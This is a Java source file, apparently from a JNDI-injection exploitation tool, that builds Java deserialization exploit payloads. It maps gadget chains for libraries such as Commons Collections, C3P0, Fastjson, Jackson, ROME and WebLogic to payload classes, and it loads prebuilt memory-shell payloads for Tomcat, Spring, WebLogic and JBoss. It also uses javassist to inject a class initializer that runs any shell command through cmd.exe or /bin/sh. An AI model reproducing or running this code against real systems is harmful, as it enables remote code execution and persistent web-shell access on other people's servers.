package sonomon.jndi.deser;

import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Random;
import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.unboundid.util.Base64;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import sun.reflect.ReflectionFactory;

import sonomon.jndi.deser.gadgets.SerializeObject;


public class Deserialize {



	
	public static byte[] getJavaSerializeData(String gadget, String payload) throws Exception{
		String serializeObjectClassName = null;
		String jarname = null;
		
		switch (gadget) {
		case "urldns":
			serializeObjectClassName = "Urldns";
			break;
		case "fileread":
			serializeObjectClassName = "FileRead";
			break;
		case "cb110":
			serializeObjectClassName = "CommonsBeanutils2";
			jarname = "commons-beanutils-1.11.0.jar";
			break;
		case "cb19":
			serializeObjectClassName = "CommonsBeanutils2";
			jarname = "commons-beanutils-1.9.3.jar";
			break;
		case "cb18":
			serializeObjectClassName = "CommonsBeanutils2";
			jarname = "commons-beanutils-1.8.3.jar";
			break;
		case "cck1":
			serializeObjectClassName = "CommonsCollectionsK1";
			break;
		case "cck2":
			serializeObjectClassName = "CommonsCollectionsK2";
			break;
		case "cck3":
			serializeObjectClassName = "CommonsCollectionsK3";
			break;
		case "cck4":
			serializeObjectClassName = "CommonsCollectionsK4";
			break;
		case "c3p095":
			serializeObjectClassName = "C3P0";
			jarname = "c3p0-0.9.5.2.jar";
			break;
		case "c3p092":
			serializeObjectClassName = "C3P0";
			jarname = "c3p0-0.9.2.jar";
			break;
		case "c3p095el":
			serializeObjectClassName = "C3P0EL";
			jarname = "c3p0-0.9.5.2.jar";
			break;
		case "c3p092el":
			serializeObjectClassName = "C3P0EL";
			jarname = "c3p0-0.9.2.jar";
			break;
		case "ajw":
			serializeObjectClassName = "Aspectjweaver";
			break;
		case "bsh20b4":
			serializeObjectClassName = "Bsh";
			jarname = "bsh-2.0b4.jar";
			break;
		case "bsh20b5":
			serializeObjectClassName = "Bsh";
			jarname = "bsh-2.0b5.jar";
			break;
		case "groovy24":
			serializeObjectClassName = "Groovy";
			jarname = "groovy-2.4.3.jar";
			break;
		case "groovy23":
			serializeObjectClassName = "Groovy";
			jarname = "groovy-2.3.9.jar";
			break;
		case "jdk7u21":
			serializeObjectClassName = "JDK7u21";
			break;
		case "jre8u20":
			serializeObjectClassName = "JRE8u20";
			break;
		case "fastjson1":
			serializeObjectClassName = "Fastjson_BadAttribute_Templates";
			break;
		case "fastjson2":
			serializeObjectClassName = "Fastjson_HotSwappableTargetSource_Templates";
			break;
		case "fastjson2_jdk7":
			serializeObjectClassName = "Fastjson_HotSwappableTargetSource_Templates_JDK7";
			break;
		case "fastjson3":
			serializeObjectClassName = "Fastjson_EventListenerList_Templates";
			break;
		case "fastjson4":
			serializeObjectClassName = "Fastjson_TextAndMnemonicHashMap_Templates";
			break;
		case "jackson1":
			serializeObjectClassName = "Jackson_BadAttribute_Templates";
			break;
		case "jackson1_100":
			serializeObjectClassName = "Jackson_BadAttribute_JdkDynamicAopProxy_Templates";
			break;
		case "jackson2":
			serializeObjectClassName = "Jackson_HotSwappableTargetSource_JdkDynamicAopProxy_Templates";
			break;
		case "jackson3":
			serializeObjectClassName = "Jackson_EventListenerList_Templates";
			break;
		case "jackson3_100":
			serializeObjectClassName = "Jackson_EventListenerList_JdkDynamicAopProxy_Templates";
			break;
		case "jackson4":
			serializeObjectClassName = "Jackson_TextAndMnemonicHashMap_Templates";
			break;
		case "jackson4_100":
			serializeObjectClassName = "Jackson_TextAndMnemonicHashMap_JdkDynamicAopProxy_Templates";
			break;
		case "rome1":
			serializeObjectClassName = "ROME1";
			break;
		case "rome1x":
			serializeObjectClassName = "ROME1x";
			break;
		case "rome2":
			serializeObjectClassName = "ROME2";
			break;
		case "rome2x":
			serializeObjectClassName = "ROME2x";
			break;
		case "rome2_jdk7":
			serializeObjectClassName = "ROME2_JDK7";
			break;
		case "rome2x_jdk7":
			serializeObjectClassName = "ROME2x_JDK7";
			break;
		case "weblogic12":
			serializeObjectClassName = "CVE_2021_2135";
			break;
		case "rhino":
			serializeObjectClassName = "MozillaRhino1";
			break;
		case "springaop21":
			serializeObjectClassName = "SpringAOP21";
			break;
		case "springaop22":
			serializeObjectClassName = "SpringAOP22";
			break;
		default:
			System.out.print("[-] deser not this gadget "+gadget+"\r\n");
			return null;
		}
		SerializeObject serializeObject = (SerializeObject) Class.forName("sonomon.jndi.deser.gadgets."+serializeObjectClassName).newInstance();
		return serializeObject.getJavaSerializeData(payload, jarname);
	}
	
	
	
	
	  public static TemplatesImpl getTemplatesImpl(String payload) throws Exception {
			TemplatesImpl tempImpl = new TemplatesImpl();
	        setFieldValue(tempImpl, "_name", "TemplatesImpl");
	        setFieldValue(tempImpl, "_tfactory", new TransformerFactoryImpl());
	    	switch (payload) {
			case "tomcatecho":
				setFieldValue(tempImpl, "_bytecodes", new byte[][]{Payload.getTemplatesImplTomcatEcho()});
		        break;
			case "tomcatbehinder":
				setFieldValue(tempImpl, "_bytecodes", new byte[][]{Payload.getTemplatesImplTomcatBehinder()});
		        break;
			case "springbehinder":
				setFieldValue(tempImpl, "_bytecodes", new byte[][]{Payload.getTemplatesImplSpringBehinder()});
		        break;
			case "weblogicecho":
				setFieldValue(tempImpl, "_bytecodes", new byte[][]{Payload.getTemplatesImplWeblogicEcho()});
		        break;
			case "weblogicbehinder":
				setFieldValue(tempImpl, "_bytecodes", new byte[][]{Payload.getTemplatesImplWeblogicBehinder()});
		        break;
			case "jbossecho":
				setFieldValue(tempImpl, "_bytecodes", new byte[][]{Payload.getTemplatesImplJbossEcho()});
		        break;
			default:
				tempImpl = (TemplatesImpl) Deserialize.createTemplatesImpl(payload);
				break;
			}
		  return tempImpl;
	  }
	  
	  public static String getBase64TemplatesImplclass(String payload) throws Exception {
			String base64payload = null;
	    	switch (payload) {
			case "tomcatecho":
				base64payload = bstobase64(Payload.getTemplatesImplTomcatEcho());
		        break;
			case "tomcatbehinder":
				base64payload = bstobase64(Payload.getTemplatesImplTomcatBehinder());
		        break;
			case "springbehinder":
				base64payload = bstobase64(Payload.getTemplatesImplSpringBehinder());
		        break;
			case "weblogicecho":
				base64payload = bstobase64(Payload.getTemplatesImplWeblogicEcho());
		        break;
			case "weblogicbehinder":
				base64payload = bstobase64(Payload.getTemplatesImplWeblogicBehinder());
			case "jbossecho":
				base64payload = bstobase64(Payload.getTemplatesImplJbossEcho());
			default:
				base64payload = payload;
				break;
			}
		  return base64payload;
	  }
	  
	  
	  public static String getBase64class(String payload) throws Exception {
			String base64payload = null;
	    	switch (payload) {
			case "tomcatecho":
				base64payload = bstobase64(Payload.getTomcatEcho());
		        break;
			case "tomcatbehinder":
				base64payload = bstobase64(Payload.getTomcatBehinder());
		        break;
			case "springbehinder":
				base64payload = bstobase64(Payload.getSpringBehinder());
		        break;
			case "weblogicecho":
				base64payload = bstobase64(Payload.getWeblogicEcho());
			case "jbossecho":
				base64payload = bstobase64(Payload.getJbossEcho());
		        break;
			default:
				base64payload = payload;
				break;
			}
		  return base64payload;
	  }
	  

	  
	  
	  
	  public static Boolean isDefaultPayload(String payload) throws Exception {
	    	switch (payload) {
			case "tomcatecho":
		        return true;
			case "tomcatbehinder":
		        return true;
			case "springbehinder":
		        return true;
			case "weblogicecho":
		        return true;
			case "weblogicbehinder":
		        return true;
			case "jbossecho":
		        return true;
			default:
		        return false;
			}
	  }
	  
	  public static Object createTemplatesImpl(String command) throws Exception {
	    if (Boolean.parseBoolean(System.getProperty("properXalan", "false")))
	      return createTemplatesImpl(command, 
	          Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), 
	          Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), 
	          Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")); 
	    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
	  }
	  
	  
	  public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
	    T templates = tplClass.newInstance();
	    ClassPool pool = ClassPool.getDefault();
	    pool.insertClassPath((javassist.ClassPath)new ClassClassPath(payload.StubTransletPayload.class));
	    pool.insertClassPath((javassist.ClassPath)new ClassClassPath(abstTranslet));
	    CtClass clazz = pool.get(payload.StubTransletPayload.class.getName());
	    command = command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"");
	    String cmd = "boolean isWin = java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\");"
	    		+ "String[] cmds = isWin ? new String[]{\"cmd.exe\", \"/c\", \""+command+"\"} : new String[]{\"/bin/sh\", \"-c\", \""+command+"\"};"
	    		+ "java.lang.Runtime.getRuntime().exec(cmds);";
	    clazz.makeClassInitializer().insertAfter(cmd);
	    clazz.setName("ysoserial.Pwner" + System.nanoTime());
	    CtClass superC = pool.get(abstTranslet.getName());
	    clazz.setSuperclass(superC);
	    clazz.getClassFile().setMajorVersion(50);
	    byte[] classBytes = clazz.toBytecode();
	    setFieldValue(templates, "_bytecodes", new byte[][] { classBytes, 
	          ClassFiles.classAsBytes(payload.Foo.class) });
	    setFieldValue(templates, "_name", "Pwnr");
	    setFieldValue(templates, "_tfactory", transFactory.newInstance());
	    return templates;
	  }
	
	    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
	        Field field = getFieldValue(obj, fieldName);
	        field.setAccessible(true);
	        field.set(obj, value);
	    }
	    
	    public static Field getFieldValue(Object obj, String fieldName) throws Exception {
	    	try {
	    		Field field = obj.getClass().getDeclaredField(fieldName);
	    		field.setAccessible(true);
	            return field;
			} catch (Exception e) {
				return getFieldValue(obj, obj.getClass(), fieldName);
			}
	    }
	    
	    public static Field getFieldValue(Object obj, Class<?> clazz, String fieldName) throws Exception {
	    	Field field;
	    	clazz = clazz.getSuperclass();
	    	try {
	    		field = clazz.getDeclaredField(fieldName);
	    		field.setAccessible(true);
	            return field;
			} catch (Exception e) {
				return getFieldValue(obj, clazz, fieldName);
			}
	    }
	    
	    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
	            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
	        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
	    }

	    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs )
	            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
	        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
		    setAccessible(objCons);
	        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
		    setAccessible(sc);
	        return (T)sc.newInstance(consArgs);
	    }
	    public static void setAccessible(AccessibleObject member) {
	        String versionStr = System.getProperty("java.version");
	        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);
	        if (javaVersion < 12) {
	          // quiet runtime warnings from JDK9+
	          Permit.setAccessible(member);
	        } else {
	          // not possible to quiet runtime warnings anymore...
	          // see https://bugs.openjdk.java.net/browse/JDK-8210522
	          // to understand impact on Permit (i.e. it does not work
	          // anymore with Java >= 12)
	          member.setAccessible(true);
	        }
	    }
	    
	    
	    
	    public static String getRandomStr(int length) {
	    	String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	    	Random random1=new Random();
	    	StringBuffer sb=new StringBuffer();
	    	for (int i = 0; i < length; i++) {
	    		int number=random1.nextInt(str.length());
	    		char charAt = str.charAt(number);
	    		sb.append(charAt);
	    	}
	    	return sb.toString();
		}
    
    
    
	public static String bstobase64(byte [] bs) throws Exception {
		String base64 = new String(Base64.encode(bs));
		return base64;
	}
}
